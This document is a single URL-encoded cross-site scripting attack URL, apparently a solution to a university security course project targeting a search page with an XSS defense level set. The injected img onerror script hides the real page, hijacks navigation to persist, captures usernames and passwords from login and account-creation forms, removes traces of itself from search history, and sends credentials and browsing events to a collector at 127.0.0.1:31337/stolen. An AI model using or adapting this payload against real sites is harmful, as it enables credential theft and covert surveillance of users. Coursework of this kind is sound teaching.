http://cs526-s18.cs.purdue.edu/project3/search?xssdefense=1&q=%3Cimg%20src%3D%27abcd%27%20onerror%3D%27function%20payload(attacker)%20%7B%0A%0A%09var%20forwardBtnStk%20%3D%20%5B%5D%3B%0A%09var%20backBtnStk%20%3D%20%5B%5D%3B%0A%09var%20curUid%20%3D%200%2C%20nextUid%20%3D%200%2C%20setUid%20%3D%200%3B%0A%09var%20sCrit%3B%0A%0A%09function%20recordEvent(input)%20%7B%0A%09%09console.log(input)%3B%0A%09%09%24.get(attacker%2C%20input)%3B%0A%09%7D%0A%0A%09function%20sendPostRequest(evt_name%2C%20log_evt)%20%7B%0A%09%09var%20usrname%20%3D%20%24(%22%23username%22).val()%3B%0A%09%09var%20pwd%20%3D%20%24(%22%23userpass%22).val()%3B%0A%0A%09%09%24.post(%22.%2F%22%20%2B%20evt_name%2C%20%7Busername%3A%20usrname%2C%20password%3A%20pwd%7D%2C%20function(data%2C%20status)%20%7B%0A%09%09%09recordEvent(%7Bevt%3A%20log_evt%2C%20user%3A%20usrname%2C%20password%3A%20pwd%7D)%3B%0A%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%7D)%3B%0A%09%7D%0A%0A%09function%20addHistory(href)%20%7B%0A%09%09setUid%2B%2B%3B%0A%09%09backBtnStk.push(href)%3B%0A%09%09window.history.pushState(%7BUID%3A%20setUid%7D%2C%20%22%22%2C%20href)%3B%0A%09%7D%0A%0A%09function%20proxy(href%2C%20qry)%20%7B%0A%09%09if%20(window.history.state%20!%3D%20null)%20%7B%0A%09%09%09curUid%20%3D%20window.history.state.UID%3B%0A%09%09%09history.replaceState(window.history.state%2C%20%22%22%2C%20href)%3B%0A%09%09%7D%20else%20%7B%0A%09%09%09history.replaceState(%7BUID%3A%20setUid%7D%2C%20%22%22%2C%20href)%3B%0A%09%09%7D%0A%20%09%09%0A%0A%09%09%24(%22html%22).load(href%2C%20function()%20%7B%0A%09%09%09%24(%22html%22).show()%3B%0A%09%09%09if%20(qry%20%3D%3D%20null%20%7C%7C%20qry.length%20%3D%3D%200%20%7C%7C%20qry%20%3D%3D%20%22.%2F%22)%20%7B%0A%09%09%09%09%24(%22%23query%22).val(%22pwned!%22)%3B%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09%24(%22%23query%22).val(qry)%3B%0A%09%09%09%7D%0A%0A%09%09%09var%20usr%20%3D%20%24(%22%23logged-in-user%22).val()%3B%0A%09%09%09recordEvent(%7Bevt%3A%20%22navigation%22%2C%20user%3A%20usr%2C%20uri%3A%20href%7D)%3B%0A%0A%09%09%09%24(%22.history-item%22).each(function(item)%20%7B%0A%09%09%09%09if(%24(this).attr(%22href%22).indexOf(%22function%20payload(%22)%20%3E%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24(this).remove()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%09%09%09%7D)%3B%0A%0A%09%09%09%24(%22%23log-in-btn%22).on(%22click%22%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09sendPostRequest(%22login%22%2C%20%22login%22)%3B%0A%0A%09%09%09%7D)%3B%0A%0A%09%09%09%24(%22%23new-account-btn%22).on(%22click%22%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09sendPostRequest(%22create%22%2C%20%22login%22)%3B%0A%09%09%09%7D)%3B%0A%0A%0A%09%09%09%24(%22%23log-out-btn%22).on(%22click%22%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09var%20usrname%20%3D%20%24(%22%23logged-in-user%22).text()%3B%0A%0A%09%09%09%09%24.post(%22.%2Flogout%22%2C%20%20function()%7B%0A%09%09%09%09%09recordEvent(%7Bevt%3A%20%22logout%22%2C%20user%3A%20usrname%7D)%3B%0A%09%09%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D)%3B%0A%0A%09%09%09%24(%22%23bungle-lnk%22).on(%22click%22%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09addHistory(href)%3B%0A%09%09%09%09proxy(%22%2Fproject3%2F%22)%3B%0A%0A%09%09%09%7D)%3B%0A%0A%09%09%09if%20(href.search(%22search%3F%22)%20!%3D%20-1)%20%7B%0A%09%09%09%09%24(%22a%22).each(function()%20%7B%0A%09%09%09%09%09if(%24(this).attr(%22href%22).indexOf(%22function%20payload(%22)%20%3E%3D%200)%20%7B%0A%09%09%09%09%09%09%24(this).remove()%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%24(this).click(%22submit%22%2C%20function(event)%20%7B%0A%09%09%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%09%09sCrit%20%3D%20%24(this).attr(%22href%22)%3B%0A%09%09%09%09%09%09sCrit%20%3D%20sCrit.replace(%2F%20%2Fg%2C%20%22%2B%22)%3B%0A%09%09%09%09%09%09proxy(%22.%2F%22%20%2B%20sCrit%2C%20sCrit)%3B%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%0A%09%09%09%24(%22%23search-again-btn%22).on(%22click%22%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09addHistory(href)%3B%0A%09%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%09%7D)%3B%0A%0A%09%09%09%24(%22%23search-btn%22).on(%22click%22%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09sCrit%20%3D%20%24(%22%23query%22).val()%3B%0A%09%09%09%09sCrit%20%3D%20sCrit.replace(%2F%20%2Fg%2C%20%22%2B%22)%3B%0A%09%09%09%09addHistory(href)%3B%0A%09%09%09%09proxy(%22.%2Fsearch%3Fq%3D%22%20%2B%20sCrit%2C%20sCrit)%3B%0A%09%09%09%7D)%3B%0A%0A%0A%09%09%09%24(window).on(%22popstate%22%2C%20function(event)%20%7B%0A%09%09%09%09nextUid%20%3D%20event.state.UID%3B%0A%09%09%09%09var%20nextHref%3B%0A%0A%09%09%09%09if%20(nextUid%20%3E%20curUid)%20%7B%0A%09%09%09%09%09nextHref%20%3D%20forwardBtnStk.pop()%3B%0A%09%09%09%09%09backBtnStk.push(href)%3B%0A%09%09%09%09%7D%20else%20%7B%0A%09%09%09%09%09nextHref%20%3D%20backBtnStk.pop()%3B%0A%09%09%09%09%09forwardBtnStk.push(href)%3B%0A%09%09%09%09%7D%0A%09%09%09%09proxy(nextHref)%3B%09%09%0A%09%09%09%7D)%3B%0A%09%09%7D)%3B%0A%09%7D%0A%09%24(%22html%22).hide()%3B%0A%09proxy(%22.%2F%22)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%27%3E%3Cimg%2F%3E
